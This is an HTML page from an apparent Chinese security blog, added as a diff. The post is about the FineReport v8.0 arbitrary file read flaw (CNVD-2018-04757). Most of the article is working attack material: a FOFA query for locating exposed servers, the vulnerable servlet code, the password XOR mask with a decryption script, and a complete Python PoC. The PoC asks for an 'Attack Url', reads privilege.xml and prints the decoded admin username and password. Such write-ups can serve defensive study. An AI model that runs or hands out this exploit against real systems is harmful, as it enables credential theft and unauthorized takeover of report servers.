@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757漏洞描述FineReport报表软件是一款纯Java编写的，集数据展示(报表)和数据录入(表单)功能于一身的企业级web报表工具。 FineReport v8.0版本存在任意文件读取漏洞，攻击者可利用漏洞读取网站任意文件。 漏洞影响FineReport &lt; v8.0 FOFAbody&#x3D;&quot;isSupportForge">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20v8.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2018-04757/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757漏洞描述FineReport报表软件是一款纯Java编写的，集数据展示(报表)和数据录入(表单)功能于一身的企业级web报表工具。 FineReport v8.0版本存在任意文件读取漏洞，攻击者可利用漏洞读取网站任意文件。 漏洞影响FineReport &lt; v8.0 FOFAbody&#x3D;&quot;isSupportForge">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:26:09.873Z">
+<meta property="article:modified_time" content="2022-07-08T09:06:16.857Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-帆软报表/帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20v8.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2018-04757/" class="article-date">
+  <time datetime="2022-07-08T06:26:09.873Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="帆软报表-v8-0-任意文件读取漏洞-CNVD-2018-04757"><a href="#帆软报表-v8-0-任意文件读取漏洞-CNVD-2018-04757" class="headerlink" title="帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757"></a>帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>FineReport报表软件是一款纯Java编写的，集数据展示(报表)和数据录入(表单)功能于一身的企业级web报表工具。</p>
+<p>FineReport v8.0版本存在任意文件读取漏洞，攻击者可利用漏洞读取网站任意文件。</p>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p><code>FineReport &lt; v8.0</code></p>
+<h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><p><code>body=&quot;isSupportForgetPwd&quot;</code></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>出现漏洞的文件为 fr-applet-8.0.jar</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fr.chart.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fr.base.FRContext;</span><br><span class="line"><span class="keyword">import</span> com.fr.general.IOUtils;</span><br><span class="line"><span class="keyword">import</span> com.fr.stable.CodeUtils;</span><br><span class="line"><span class="keyword">import</span> com.fr.web.core.ActionNoSessionCMD;</span><br><span class="line"><span class="keyword">import</span> com.fr.web.utils.WebUtils;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChartGetFileContentAction</span> <span class="keyword">extends</span> <span class="title class_">ActionNoSessionCMD</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ChartGetFileContentAction</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionCMD</span><span class="params">(HttpServletRequest var1, HttpServletResponse var2, String var3)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> CodeUtils.cjkDecode(WebUtils.getHTTPRequestParameter(var1, <span class="string">&quot;resourcepath&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (!WebUtils.invalidResourcePath(var4)) &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">var5</span> <span class="operator">=</span> FRContext.getCurrentEnv().readResource(var4);</span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> IOUtils.inputStream2String(var5);</span><br><span class="line">            var6 = var6.replace(<span class="string">&#x27;\ufeff&#x27;</span>, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">            WebUtils.printAsString(var2, var6);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCMD</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;get_geo_json&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用request将文件名传入 调用cjkDecode函数解密文件名</p>
+<p>使用invalidResourcePath函数校验文件是否存在</p>
+<p>最后使用readResource函数读取文件传输到浏览器上 默认目录为resources</p>
+<p>其中的privilege.xml里面存储了后台的用户名密码</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PrivilegeManager</span> <span class="attr">xmlVersion</span>=<span class="string">&quot;20170715&quot;</span> <span class="attr">releaseVersion</span>=<span class="string">&quot;8.0.0&quot;</span> <span class="attr">fsSystemManagerPassSet</span>=<span class="string">&quot;true&quot;</span> <span class="attr">birthday</span>=<span class="string">&quot;0&quot;</span> <span class="attr">male</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rootManagerName</span>&gt;</span></span><br><span class="line">&lt;![CDATA[admin]]&gt;<span class="tag">&lt;/<span class="name">rootManagerName</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rootManagerPassword</span>&gt;</span></span><br><span class="line">&lt;![CDATA[___00520017004e002b004100b7004200250023007f003d003d005400e4001c0057]]&gt;<span class="tag">&lt;/<span class="name">rootManagerPassword</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">AP</span> <span class="attr">class</span>=<span class="string">&quot;com.fr.privilege.providers.NoAuthenticationProvider&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ForwardUrl</span>&gt;</span></span><br><span class="line">&lt;![CDATA[$&#123;servletURL&#125;?op=fr_platform]]&gt;<span class="tag">&lt;/<span class="name">ForwardUrl</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PVFILTER</span> <span class="attr">class</span>=<span class="string">&quot;com.fr.fs.privilege.auth.BasePrivilegeFilter&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">PrivilegeManager</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>加密函数</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">passwordEncode</span><span class="params">(String var0)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        var1.append(<span class="string">&quot;___&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (var0 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="number">0</span>; var3 &lt; var0.length(); ++var3) &#123;</span><br><span class="line">                <span class="keyword">if</span> (var2 == PASSWORD_MASK_ARRAY.length) &#123;</span><br><span class="line">                    var2 = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> <span class="variable">var4</span> <span class="operator">=</span> var0.charAt(var3) ^ PASSWORD_MASK_ARRAY[var2];</span><br><span class="line">                <span class="type">String</span> <span class="variable">var5</span> <span class="operator">=</span> Integer.toHexString(var4);</span><br><span class="line">                <span class="type">int</span> <span class="variable">var6</span> <span class="operator">=</span> var5.length();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="number">0</span>; var7 &lt; <span class="number">4</span> - var6; ++var7) &#123;</span><br><span class="line">                    var5 = <span class="string">&quot;0&quot;</span> + var5;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var1.append(var5);</span><br><span class="line">                ++var2;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var1.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>解密函数</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">passwordDecode</span><span class="params">(String var0)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (var0 != <span class="literal">null</span> &amp;&amp; var0.startsWith(<span class="string">&quot;___&quot;</span>)) &#123;</span><br><span class="line">            var0 = var0.substring(<span class="number">3</span>);</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="type">int</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="number">0</span>; var3 &lt;= var0.length() - <span class="number">4</span>; var3 += <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (var2 == PASSWORD_MASK_ARRAY.length) &#123;</span><br><span class="line">                    var2 = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var0.substring(var3, var3 + <span class="number">4</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">var5</span> <span class="operator">=</span> Integer.parseInt(var4, <span class="number">16</span>) ^ PASSWORD_MASK_ARRAY[var2];</span><br><span class="line">                var1.append((<span class="type">char</span>)var5);</span><br><span class="line">                ++var2;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var0 = var1.toString();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var0;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>使用python写出的解密代码为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">&#x27;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;</span> <span class="comment">#密文</span></span><br><span class="line">PASSWORD_MASK_ARRAY = [<span class="number">19</span>, <span class="number">78</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">100</span>, <span class="number">213</span>, <span class="number">43</span>, <span class="number">23</span>] <span class="comment">#掩码</span></span><br><span class="line">Password = <span class="string">&quot;&quot;</span></span><br><span class="line">cipher = cipher[<span class="number">3</span>:] <span class="comment">#截断三位后</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(cipher) / <span class="number">4</span>)):</span><br><span class="line">    c1 = <span class="built_in">int</span>(<span class="string">&quot;0x&quot;</span> + cipher[i * <span class="number">4</span>:(i + <span class="number">1</span>) * <span class="number">4</span>], <span class="number">16</span>)</span><br><span class="line">    c2 = c1 ^ PASSWORD_MASK_ARRAY[i % <span class="number">8</span>]</span><br><span class="line">    Password = Password + <span class="built_in">chr</span>(c2)</span><br><span class="line"><span class="built_in">print</span> (Password)</span><br></pre></td></tr></table></figure>
+<p>这里使用上面讲述的原理进行复现,访问目标</p>
+<p>![](/resource/帆软报表v8.0任意文件读取漏洞CNVD-2018-04757/media/1.png)</p>
+<p><code>路径分为两种</code></p>
+<p><code>/WebReport/ReportServer</code></p>
+<p><code>ReportServer</code></p>
+<p>访问POC为,读取密码文件 privilege.xml</p>
+<p>![](/resource/帆软报表v8.0任意文件读取漏洞CNVD-2018-04757/media/2.png)</p>
+<p>使用解密脚本解密文件</p>
+<p>![](/resource/帆软报表v8.0任意文件读取漏洞CNVD-2018-04757/media/3.png)</p>
+<p>得到密码，即可登陆后台系统，账户为 admin</p>
+<p>![](/resource/帆软报表v8.0任意文件读取漏洞CNVD-2018-04757/media/4.png)</p>
+<h2 id="漏洞利用POC"><a href="#漏洞利用POC" class="headerlink" title="漏洞利用POC"></a>漏洞利用POC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34m公众号  : PeiQi文库                                                   \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mVersion: 帆软报表 v8.0                                              \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_passwd</span>(<span class="params">cipher</span>):</span><br><span class="line">    PASSWORD_MASK_ARRAY = [<span class="number">19</span>, <span class="number">78</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">100</span>, <span class="number">213</span>, <span class="number">43</span>, <span class="number">23</span>]  <span class="comment"># 掩码</span></span><br><span class="line">    Password = <span class="string">&quot;&quot;</span></span><br><span class="line">    cipher = cipher[<span class="number">3</span>:]  <span class="comment"># 截断三位后</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(cipher) / <span class="number">4</span>)):</span><br><span class="line">        c1 = <span class="built_in">int</span>(<span class="string">&quot;0x&quot;</span> + cipher[i * <span class="number">4</span>:(i + <span class="number">1</span>) * <span class="number">4</span>], <span class="number">16</span>)</span><br><span class="line">        c2 = c1 ^ PASSWORD_MASK_ARRAY[i % <span class="number">8</span>]</span><br><span class="line">        Password = Password + <span class="built_in">chr</span>(c2)</span><br><span class="line">    <span class="keyword">return</span> Password</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url</span>):</span><br><span class="line">    vuln_url_1 = target_url + <span class="string">&#x27;/WebReport/ReportServer&#x27;</span></span><br><span class="line">    vuln_url_2 = target_url + <span class="string">&#x27;/ReportServer&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response_1 = requests.get(url=vuln_url_1, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>, headers=headers)</span><br><span class="line">        response_2 = requests.get(url=vuln_url_2, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;部署页面&quot;</span> <span class="keyword">in</span> response_1.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 目标部署页面为: &#123;&#125; \033[0m&quot;</span>.<span class="built_in">format</span>(vuln_url_1))</span><br><span class="line">            POC_2(vuln_url_1)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;部署页面&quot;</span> <span class="keyword">in</span> response_2.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 目标部署页面为: &#123;&#125; \033[0m&quot;</span>.<span class="built_in">format</span>(vuln_url_2))</span><br><span class="line">            POC_2(vuln_url_2)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 目标漏洞无法利用 \033[0m&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 目标漏洞无法利用 &#123;&#125; \033[0m&quot;</span>.<span class="built_in">format</span>(e))</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_2</span>(<span class="params">vuln_url_fileread</span>):</span><br><span class="line">    vuln_url = vuln_url_fileread + <span class="string">&quot;?op=chart&amp;cmd=get_geo_json&amp;resourcepath=privilege.xml&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 正在访问: &#123;&#125; \033[0m&quot;</span>.<span class="built_in">format</span>(vuln_url))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;rootManagerPassword&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 目标存在漏洞,读取敏感文件 \n&#123;&#125; \033[0m&quot;</span>.<span class="built_in">format</span>(response.text))</span><br><span class="line">            user_name = re.findall(<span class="string">r&#x27;&lt;!\[CDATA\[(.*?)]]&gt;&lt;/rootManagerName&gt;&#x27;</span>, response.text)</span><br><span class="line">            cipher = re.findall(<span class="string">r&#x27;&lt;!\[CDATA\[(.*?)]]&gt;&lt;/rootManagerPassword&gt;&#x27;</span>, response.text)</span><br><span class="line">            password = decode_passwd(cipher[<span class="number">0</span>])</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[34m[o] 后台账户密码为:&#123;&#125; &#123;&#125; \033[0m&quot;</span>.<span class="built_in">format</span>(user_name[<span class="number">0</span>], password))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 目标 &#123;&#125; 请求失败 \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    title()</span><br><span class="line">    target_url = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">    POC_1(target_url)</span><br></pre></td></tr></table></figure>
+
+<p>![](/resource/帆软报表v8.0任意文件读取漏洞CNVD-2018-04757/media/5.png)</p>
+<h2 id="Goby-amp-POC"><a href="#Goby-amp-POC" class="headerlink" title="Goby &amp; POC"></a>Goby &amp; POC</h2><p><code>帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757</code></p>
+<p>![](/resource/帆软报表v8.0任意文件读取漏洞CNVD-2018-04757/media/6.png)</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20v8.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2018-04757/" data-id="cl5c2r04r00p2y8v140ws9gfy" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AE%20E-Bridge%20%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8/%E5%B8%86%E8%BD%AF%20V9%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
